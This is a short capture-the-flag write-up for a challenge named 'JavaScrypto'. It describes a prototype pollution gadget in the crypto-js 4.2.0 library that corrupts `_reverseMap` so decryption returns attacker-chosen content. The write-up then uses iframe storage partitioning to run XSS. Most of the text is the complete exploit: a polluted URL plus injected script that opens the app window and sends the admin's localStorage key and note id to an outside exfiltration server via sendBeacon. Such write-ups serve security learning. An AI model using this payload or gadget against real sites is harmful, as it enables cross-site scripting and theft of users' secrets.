### JavaScrypto

The challenge was about finding a Prototype Pollution gadget in `https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js`. 
We found out that we could pollute `_reverseMap` and cause decryption to return arbitrary content. 

We needed to steal admin's `key` and `note id` from `localStorage` but displaying a malicious note would replace these values. 
We used the fact that the storage in Chrome is partitioned by `<top_site, frame_site>` so by executing the XSS inside iframe we wouldn't overwrite admin's secrets.
Then from that iframe we can open a window to read the secrets and decrypt the flag.

Final exploit below:

```html
<body></body>
<script>    
var ifr = document.createElement('iframe');

var url = new URL(`http://web:3000/?id=e8b8f64f-9eea-4dd5-a01a-bcd1fbf403b5&__proto__[_reverseMap][320]=0&__proto__[_reverseMap][321]=1&__proto__[_reverseMap][322]=2&__proto__[_reverseMap][323]=3&__proto__[_reverseMap][324]=4&__proto__[_reverseMap][325]=5&__proto__[_reverseMap][326]=6&__proto__[_reverseMap][327]=7&__proto__[_reverseMap][328]=8&__proto__[_reverseMap][329]=9&__proto__[_reverseMap][330]=10&__proto__[_reverseMap][331]=11&__proto__[_reverseMap][332]=12&__proto__[_reverseMap][333]=13&__proto__[_reverseMap][334]=14&__proto__[_reverseMap][335]=15&__proto__[_reverseMap][336]=16&__proto__[_reverseMap][337]=17&__proto__[_reverseMap][338]=18&__proto__[_reverseMap][339]=19&__proto__[_reverseMap][340]=20&__proto__[_reverseMap][341]=21&__proto__[_reverseMap][342]=22&__proto__[_reverseMap][343]=23&__proto__[_reverseMap][344]=24&__proto__[_reverseMap][345]=25&__proto__[_reverseMap][352]=26&__proto__[_reverseMap][353]=27&__proto__[_reverseMap][354]=28&__proto__[_reverseMap][355]=29&__proto__[_reverseMap][356]=30&__proto__[_reverseMap][357]=31&__proto__[_reverseMap][358]=32&__proto__[_reverseMap][359]=33&__proto__[_reverseMap][360]=34&__proto__[_reverseMap][361]=35&__proto__[_reverseMap][362]=36&__proto__[_reverseMap][363]=37&__proto__[_reverseMap][364]=38&__proto__[_reverseMap][365]=39&__proto__[_reverseMap][366]=40&__proto__[_reverseMap][367]=41&__proto__[_reverseMap][368]=42&__proto__[_reverseMap][369]=43&__proto__[_reverseMap][370]=44&__proto__[_reverseMap][371]=45&__proto__[_reverseMap][372]=46&__proto__[_reverseMap][373]=47&__proto__[_reverseMap][374]=48&__proto__[_reverseMap][375]=49&__proto__[_reverseMap][376]=50&__proto__[_reverseMap][377]=51&__proto__[_reverseMap][303]=52&__proto__[_reverseMap][304]=53&__proto__[_reverseMap][305]=54&__proto__[_reverseMap][306]=55&__proto__[_reverseMap][307]=56&__proto__[_reverseMap][308]=57&__proto__[_reverseMap][309]=58&__proto__[_reverseMap][310]=59&__proto__[_reverseMap][311]=60&__proto__[_reverseMap][312]=61&__proto__[_reverseMap][298]=62&__proto__[_reverseMap][302]=63`);
url.searchParams.set('code', `var win=window.open('http://web:3000/');setTimeout(()=>{navigator.sendBeacon('https://exfil-server.com', [win.localStorage.getItem('key'), win.localStorage.getItem('currentId')])},1000);`);
ifr.src = url.href;
document.body.appendChild(ifr);
</script>
```
